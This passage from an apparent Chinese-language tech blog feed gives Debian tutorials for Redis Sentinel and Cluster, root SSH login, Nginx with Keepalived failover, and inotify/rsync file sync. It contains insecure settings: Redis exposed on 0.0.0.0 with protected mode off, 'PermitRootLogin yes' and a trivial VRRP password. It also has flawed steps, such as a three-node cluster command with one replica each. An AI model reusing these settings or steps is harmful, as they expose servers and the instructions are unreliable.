class="string">&quot;hello_redis&quot;</span></span><br></pre></td></tr></table></figure><p>在从节点验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br><span class="line">GET test_key</span><br><span class="line"><span class="comment"># 应返回 &quot;hello_redis&quot;</span></span><br></pre></td></tr></table></figure><h2 id="3-配置-Sentinel"><a href="#3-配置-Sentinel" class="headerlink" title="3. 配置 Sentinel"></a>3. 配置 Sentinel</h2><p>配置文件路径<br>默认 Sentinel 配置文件路径为 &#x2F;etc&#x2F;redis&#x2F;sentinel.conf。</p><p>编辑 Sentinel 配置文件<br>在所有服务器（192.168.1.101、192.168.1.102、192.168.1.103）上，编辑 &#x2F;etc&#x2F;redis&#x2F;sentinel.conf：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义监控的主节点名称和地址</span></span><br><span class="line">sentinel monitor mymaster 192.168.1.101 6379 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置检测主节点失败的时间（毫秒）</span></span><br><span class="line">sentinel down-after-milliseconds mymaster 5000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置故障转移完成的超时时间（毫秒）</span></span><br><span class="line">sentinel failover-timeout mymaster 10000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果启用了密码认证，请设置主节点密码</span></span><br><span class="line"><span class="comment"># sentinel auth-pass mymaster &lt;的密码&gt;</span></span><br></pre></td></tr></table></figure><p>启动 Sentinel<br>在每台服务器上分别启动 Sentinel：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis/sentinel.conf --sentinel</span><br></pre></td></tr></table></figure><h2 id="4-验证-Sentinel"><a href="#4-验证-Sentinel" class="headerlink" title="4. 验证 Sentinel"></a>4. 验证 Sentinel</h2><p>查看 Sentinel 状态<br>在任意 Sentinel 节点执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 26379</span><br><span class="line">SENTINEL masters</span><br></pre></td></tr></table></figure><p>输出应显示主节点的信息，例如：</p><p>name: mymaster, status: ok, slaves: 2</p><p>模拟故障转移<br>手动停止主节点服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop redis</span><br></pre></td></tr></table></figure><p>Sentinel 将检测主节点不可用，并自动提升从节点为主节点。<br>验证新的主节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 26379</span><br><span class="line">SENTINEL get-master-addr-by-name mymaster</span><br></pre></td></tr></table></figure><p>新主节点的 IP 和端口将被返回。</p><h3 id="5-高可用性测试"><a href="#5-高可用性测试" class="headerlink" title="5. 高可用性测试"></a>5. 高可用性测试</h3><p>在新主节点上插入数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h &lt;新主节点IP&gt;</span><br><span class="line">SET test_key2 <span class="string">&quot;new_data&quot;</span></span><br></pre></td></tr></table></figure><p>验证数据是否同步到从节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h &lt;从节点IP&gt;</span><br><span class="line">GET test_key2</span><br></pre></td></tr></table></figure><p>总结<br>通过 Redis Sentinel，可以实现：</p><p>自动故障检测：当主节点不可用时，Sentinel 会自动检测并进行切换。<br>自动主从切换：从节点自动提升为主节点，保障服务持续可用。<br>无需人工干预：服务的高可用性大大提高。<br>如需进一步调整配置（如增加节点或优化参数），可根据具体业务需求进行调整。</p><h1 id="Redis-Cluster"><a href="#Redis-Cluster" class="headerlink" title="Redis Cluster"></a>Redis Cluster</h1><h2 id="步骤一：安装Redis"><a href="#步骤一：安装Redis" class="headerlink" title="步骤一：安装Redis"></a>步骤一：安装Redis</h2><p>在每台服务器上安装Redis。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install redis-server</span><br></pre></td></tr></table></figure><h2 id="步骤二：配置Redis"><a href="#步骤二：配置Redis" class="headerlink" title="步骤二：配置Redis"></a>步骤二：配置Redis</h2><p>备份原始配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> /etc/redis/redis.conf /etc/redis/redis.conf.bak</span><br></pre></td></tr></table></figure><p><strong>编辑Redis配置文件：</strong><br>编辑 &#x2F;etc&#x2F;redis&#x2F;redis.conf 文件，进行以下修改：<br>启用集群模式：</p><p>cluster-enabled yes<br><strong>指定集群配置文件：</strong></p><p>cluster-config-file nodes-6379.conf<br><strong>设置节点超时时间：</strong><br>cluster-node-timeout 5000<br><strong>启用AOF持久化（可选，但推荐）：</strong><br>appendonly yes<br><strong>绑定服务器的IP地址：</strong><br>将 bind 127.0.0.1 修改为服务器的实际IP地址，例如：<br>bind 192.168.1.1<br><strong>设置监听端口：</strong><br>默认端口是6379，确保每个节点的端口不同。例如，第一台服务器保持6379，第二台服务器可以设置为6380，第三台服务器可以设置为6381。</p><h2 id="步骤三：启动Redis服务"><a href="#步骤三：启动Redis服务" class="headerlink" title="步骤三：启动Redis服务"></a>步骤三：启动Redis服务</h2><p>在每台服务器上启动Redis服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis-server</span><br></pre></td></tr></table></figure><h2 id="步骤四：创建Redis集群"><a href="#步骤四：创建Redis集群" class="headerlink" title="步骤四：创建Redis集群"></a>步骤四：创建Redis集群</h2><p>下载Redis工具：<br>如果你还没有安装Redis的命令行工具，可以从官方GitHub仓库下载最新的Redis版本，解压后找到 redis-trib.rb 脚本。<br>创建集群：<br>使用 redis-cli 工具来创建集群。假设你的三台服务器的IP地址分别为 192.168.1.1、192.168.1.2 和 192.168.1.3，且Redis实例分别监听6379、6380和6381端口，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli --cluster create 192.168.1.1:6379 192.168.1.2:6380 192.168.1.3:6381 --cluster-replicas 1</span><br></pre></td></tr></table></figure><p>这里 –cluster-replicas 1 表示每个主节点有一个副本。</p><h2 id="步骤五：验证集群"><a href="#步骤五：验证集群" class="headerlink" title="步骤五：验证集群"></a>步骤五：验证集群</h2><p>连接到任意一个节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.1.1 -p 6379</span><br></pre></td></tr></table></figure><p>执行基本命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> testkey <span class="string">&quot;Hello Redis Cluster&quot;</span></span><br><span class="line">get testkey</span><br></pre></td></tr></table></figure><p>检查集群状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cluster nodes</span><br></pre></td></tr></table></figure><h2 id="步骤六：监控和维护"><a href="#步骤六：监控和维护" class="headerlink" title="步骤六：监控和维护"></a>步骤六：监控和维护</h2><p>定期检查日志：<br>查看 &#x2F;var&#x2F;log&#x2F;redis&#x2F;redis-server.log 文件中的日志信息，确保没有错误。<br>监控性能：<br>使用 redis-cli 的 info 命令来监控集群的性能和状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.1.1 -p 6379 info</span><br></pre></td></tr></table></figure><h1 id="Debian-root登录"><a href="#Debian-root登录" class="headerlink" title="Debian root登录"></a>Debian root登录</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PermitRootLogin yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># 重启ssh服务，使配置生效</span></span><br><span class="line">sudo systemctl restart ssh</span><br></pre></td></tr></table></figure><h1 id="debian-更换源"><a href="#debian-更换源" class="headerlink" title="debian 更换源"></a>debian 更换源</h1><h2 id="1-备份文件"><a href="#1-备份文件" class="headerlink" title="1.  备份文件"></a>1.  备份文件</h2><p>cp &#x2F;etc&#x2F;apt&#x2F;sources.list  &#x2F;etc&#x2F;apt&#x2F;sources.list.bak</p><h2 id="2-更改-sources-list文件内容为："><a href="#2-更改-sources-list文件内容为：" class="headerlink" title="2. 更改 sources.list文件内容为："></a>2. 更改 sources.list文件内容为：</h2><p>(官方源)<br>deb <a class="link"   href="http://deb.debian.org/debian" >http://deb.debian.org/debian<i class="fas fa-external-link-alt"></i></a> bullseye main contrib non-free<br>deb-src <a class="link"   href="http://deb.debian.org/debian" >http://deb.debian.org/debian<i class="fas fa-external-link-alt"></i></a> bullseye main contrib non-free</p><h2 id="3-更新"><a href="#3-更新" class="headerlink" title="3. 更新"></a>3. 更新</h2><p>apt-get -y update</p><!--https://www.runoob.com/redis/redis-commands.html在Debian系统上安装Redis并设置密码可以按照以下步骤进行：安装Redis更新软件包列表：Bashsudo apt update安装Redis服务器：Bashsudo apt install redis-server设置Redis密码编辑Redis配置文件：使用文本编辑器（如nano或vim）打开Redis配置文件。通常这个文件位于/etc/redis/redis.conf。Bashsudo nano /etc/redis/redis.conf找到requirepass指令：在配置文件中搜索requirepass关键字。默认情况下，这一行可能被注释掉了（前面有#号）。设置密码：删除#号以取消注释，并设置的密码。例如：Confrequirepass yourStrongPasswordHere请确保选择一个强密码来保护的Redis实例。保存并退出编辑器：如果使用的是nano，可以按Ctrl+X，然后按Y确认保存，最后按Enter退出。如果使用的是vim，可以按Esc键，然后输入:wq保存并退出。重启Redis服务为了使更改生效，需要重启Redis服务：Bashsudo systemctl restart redis.service验证设置可以通过Redis客户端连接到服务器来验证密码是否设置成功：Bashredis-cli在Redis命令行界面中，尝试执行一个命令，比如GET foo，会看到一个错误消息，提示需要认证。然后使用AUTH命令进行认证：BashAUTH yourStrongPasswordHere如果密码正确，应该会收到一个表示成功的回复，之后就可以正常执行其他命令了。-->]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; Debian 服务器上部署分布式 Redis 可以实现高可用性或负载均衡，具体可以选择以下两种方案之一：&lt;/p&gt;
&lt;p&gt;主从复制 (Master-Slave Replication)&lt;br&gt;主从复制用于数据冗余备份和读写分离，但并不提供自动故障切换功能。&lt;/p&gt;
&lt;h1 </summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="redis" scheme="https://banjinmei.github.io/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>nginx keepalived</title>
    <link href="https://banjinmei.github.io/2024/11/21/nginx-keepalived/"/>
    <id>https://banjinmei.github.io/2024/11/21/nginx-keepalived/</id>
    <published>2024-11-21T15:37:23.000Z</published>
    <updated>2024-11-21T15:54:57.040Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Keepalived"><a href="#Keepalived" class="headerlink" title="Keepalived"></a>Keepalived</h1><p>是一种用于实现高可用性的工具，它通过VRRP（虚拟路由冗余协议）来管理虚拟IP地址，从而确保在主服务器故障时，备用服务器能够接管服务。</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>假设有两台Debian服务器：</p><p>Server 1 (Master): IP地址 192.168.1.100<br>Server 2 (Backup): IP地址 192.168.1.101<br>虚拟IP地址: 192.168.1.102</p><h1 id="步骤一：安装Nginx"><a href="#步骤一：安装Nginx" class="headerlink" title="步骤一：安装Nginx"></a>步骤一：安装Nginx</h1><p>在两台服务器上安装Nginx。</p><p>Server 1 (Master)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure><p>Server 2 (Backup)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure><h1 id="步骤二：安装Keepalived"><a href="#步骤二：安装Keepalived" class="headerlink" title="步骤二：安装Keepalived"></a>步骤二：安装Keepalived</h1><p>在两台服务器上安装Keepalived。</p><p>Server 1 (Master)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install keepalived</span><br><span class="line">Server 2 (Backup)</span><br><span class="line">```Bash</span><br><span class="line">sudo apt install keepalived</span><br></pre></td></tr></table></figure><h1 id="步骤三：配置Keepalived"><a href="#步骤三：配置Keepalived" class="headerlink" title="步骤三：配置Keepalived"></a>步骤三：配置Keepalived</h1><p>编辑Keepalived的配置文件 &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf。</p><p>Server 1 (Master)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/keepalived/keepalived.conf</span><br></pre></td></tr></table></figure><p>添加以下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state MASTER</span><br><span class="line">    interface eth0</span><br><span class="line">    virtual_router_id 51</span><br><span class="line">    priority 100</span><br><span class="line">    advert_int 1</span><br><span class="line"></span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.1.102</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Server 2 (Backup)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/keepalived/keepalived.conf</span><br></pre></td></tr></table></figure><p>添加以下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state BACKUP</span><br><span class="line">    interface eth0</span><br><span class="line">    virtual_router_id 51</span><br><span class="line">    priority 90</span><br><span class="line">    advert_int 1</span><br><span class="line"></span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.1.102</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="步骤四：启动Keepalived"><a href="#步骤四：启动Keepalived" class="headerlink" title="步骤四：启动Keepalived"></a>步骤四：启动Keepalived</h1><p>启动并启用Keepalived服务。</p><p>Server 1 (Master)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start keepalived</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> keepalived</span><br></pre></td></tr></table></figure><p>Server 2 (Backup)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start keepalived</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> keepalived</span><br></pre></td></tr></table></figure><h2 id="步骤五：配置Nginx"><a href="#步骤五：配置Nginx" class="headerlink" title="步骤五：配置Nginx"></a>步骤五：配置Nginx</h2><p>确保两台服务器上的Nginx配置相同。编辑Nginx配置文件 &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default。</p><p>Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name your_domain_or_ip;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://backend_servers;</span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">        proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>步骤六：测试配置<br>测试Nginx配置文件是否正确无误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -t</span><br></pre></td></tr></table></figure><p>重新加载Nginx以使更改生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl reload nginx</span><br></pre></td></tr></table></figure><p>步骤七：验证高可用性<br>访问虚拟IP地址:<br>使用浏览器或其他工具访问虚拟IP地址 192.168.1.102，确保Nginx服务正常工作。<br>模拟故障:<br>关闭主服务器上的Nginx服务或Keepalived服务，观察备用服务器是否接管虚拟IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop nginx</span><br><span class="line">sudo systemctl stop keepalived</span><br></pre></td></tr></table></figure><p>检查状态:<br>在备用服务器上检查虚拟IP地址是否已经接管：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show eth0</span><br></pre></td></tr></table></figure><p>步骤八：日志和监控<br>查看Keepalived的日志以确保没有错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">tail</span> -f /var/log/syslog</span><br></pre></td></tr></table></figure><p>通过以上步骤，可以在两台Debian服务器上成功部署Keepalived实现高可用Nginx。<br>这样，即使主服务器发生故障，备用服务器也会自动接管服务，确保系统的高可用性和稳定性。</p><h1 id="不同虚拟IP地址的高可用性："><a href="#不同虚拟IP地址的高可用性：" class="headerlink" title="不同虚拟IP地址的高可用性："></a>不同虚拟IP地址的高可用性：</h1><p>跨云服务商</p><h2 id="1-使用DNS轮询"><a href="#1-使用DNS轮询" class="headerlink" title="1. 使用DNS轮询"></a>1. 使用DNS轮询</h2><p>通过DNS轮询（Round Robin DNS）来实现负载均衡和高可用性。</p><p>步骤：<br>如 example.com。<br>配置DNS记录:<br>在DNS管理面板中，为的域名配置两个A记录，分别指向两个云服务商的IP地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">example.com.  A  192.168.1.100  (阿里云IP)</span><br><span class="line">example.com.  A  192.168.1.101  (腾讯云IP)</span><br></pre></td></tr></table></figure><p>客户端访问:<br>当客户端访问 example.com 时，DNS服务器会轮流返回两个IP地址之一，实现负载均衡。<br>健康检查:<br>可以使用DNS提供商的健康检查功能，自动将流量切换到健康的服务器。</p><h2 id="2-使用全局负载均衡器"><a href="#2-使用全局负载均衡器" class="headerlink" title="2. 使用全局负载均衡器"></a>2. 使用全局负载均衡器</h2><p>一些云服务商提供了全局负载均衡器（Global Load Balancer），可以跨区域和跨服务商实现高可用性。</p><h1 id="nginx-配置文件的同步"><a href="#nginx-配置文件的同步" class="headerlink" title="nginx 配置文件的同步"></a>nginx 配置文件的同步</h1><p>使用 <strong>inotify</strong> 和 <strong>rsync</strong> 实现两个 Debian 服务器之间的数据实时同步是一个常见且有效的方法。<br>inotify 可以监控文件系统的变更事件，而 rsync 则负责实际的数据同步。以下是详细的步骤：</p><h1 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h1><p>Server 1 (Master): IP地址 192.168.1.100<br>Server 2 (Backup): IP地址 192.168.1.101</p><h1 id="步骤一：安装必要的软件"><a href="#步骤一：安装必要的软件" class="headerlink" title="步骤一：安装必要的软件"></a>步骤一：安装必要的软件</h1><p>在两台服务器上安装 rsync 和 inotify-tools。</p><p>Server 1 (Master)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install rsync inotify-tools</span><br></pre></td></tr></table></figure><p>Server 2 (Backup)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install rsync</span><br></pre></td></tr></table></figure><h1 id="步骤二：配置-SSH-密钥免密登录"><a href="#步骤二：配置-SSH-密钥免密登录" class="headerlink" title="步骤二：配置 SSH 密钥免密登录"></a>步骤二：配置 SSH 密钥免密登录</h1><p>为了简化 rsync 的操作，建议配置从主服务器到备份服务器的 SSH 密钥免密登录。</p><p>在主服务器上生成 SSH 密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br></pre></td></tr></table></figure><p>按提示操作，默认保存路径即可。</p><p>将公钥复制到备份服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id user@192.168.1.101</span><br></pre></td></tr></table></figure><h1 id="步骤三：编写同步脚本"><a href="#步骤三：编写同步脚本" class="headerlink" title="步骤三：编写同步脚本"></a>步骤三：编写同步脚本</h1><p>在主服务器上编写一个脚本，使用 inotifywait 监控文件系统的变更事件，并调用 rsync 进行同步。</p><p>创建同步脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /usr/local/bin/inotify_sync.sh</span><br></pre></td></tr></table></figure><p>添加以下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监控的目录</span></span><br><span class="line">WATCH_DIR=<span class="string">&quot;/path/to/sync&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份服务器的IP地址和目标目录</span></span><br><span class="line">REMOTE_USER=<span class="string">&quot;user&quot;</span></span><br><span class="line">REMOTE_HOST=<span class="string">&quot;192.168.1.101&quot;</span></span><br><span class="line">REMOTE_DIR=<span class="string">&quot;/path/to/sync&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 inotifywait 监控目录变化</span></span><br><span class="line">inotifywait -m -r -e modify,create,delete,move <span class="string">&quot;<span class="variable">$WATCH_DIR</span>&quot;</span> | <span class="keyword">while</span> <span class="built_in">read</span> path action file; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Change detected: <span class="variable">$action</span> <span class="variable">$file</span> on <span class="variable">$path</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 rsync 同步文件</span></span><br><span class="line">    rsync -avz --delete --exclude <span class="string">&#x27;.git&#x27;</span> --exclude <span class="string">&#x27;.DS_Store&#x27;</span> <span class="string">&quot;<span class="variable">$WATCH_DIR</span>/&quot;</span> <span class="string">&quot;<span class="variable">$REMOTE_USER</span>@<span class="variable">$REMOTE_HOST</span>:<span class="variable">$REMOTE_DIR</span>/&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>赋予脚本执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/inotify_sync.sh</span><br></pre></td></tr></table></figure><p>步骤四：启动同步脚本<br>可以手动启动脚本，或者将其添加到 systemd 服务中以确保其在后台持续运行。</p><p>手动启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">nohup</span> /usr/local/bin/inotify_sync.sh &amp;</span><br></pre></td></tr></table></figure><h1 id="创建-systemd-服务-启动"><a href="#创建-systemd-服务-启动" class="headerlink" title="创建 systemd 服务 启动"></a>创建 systemd 服务 启动</h1><p>创建服务文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/systemd/system/inotify_sync.service</span><br></pre></td></tr></table></figure><p>添加以下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Ini</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Inotify Sync Service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/usr/local/bin/inotify_sync.sh</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>启动并启用服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl start inotify_sync.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> inotify_sync.service</span><br></pre></td></tr></table></figure><h1 id="步骤五：验证同步"><a href="#步骤五：验证同步" class="headerlink" title="步骤五：验证同步"></a>步骤五：验证同步</h1><p>在主服务器上创建或修改文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Test content&quot;</span> &gt; /path/to/sync/testfile.txt</span><br></pre></td></tr></table></figure><p>在备份服务器上检查文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /path/to/sync/</span><br><span class="line"><span class="built_in">cat</span> /path/to/sync/testfile.txt</span><br></pre></td></tr></table></figure><p>注意事项<br><strong>性能考虑:</strong><br>inotify 会消耗一定的系统资源，特别是在监控大量文件时。确保的服务器有足够的资源来处理这些事件。<br>可以通过排除不必要的文件或目录（如 .git、.DS_Store）来减少不必要的同步操作。<br><strong>安全考虑:</strong><br>确保 SSH 密钥的安全性，避免泄露。<br>可以使用更严格的 SSH 配置，例如限制密钥的使用范围和有效期。<br>通过以上步骤，可以在两台 Debian 服务器之间使用 inotify 和 rsync 实现实时数据同步。</p><h1 id="nginx-反代"><a href="#nginx-反代" class="headerlink" title="nginx 反代"></a>nginx 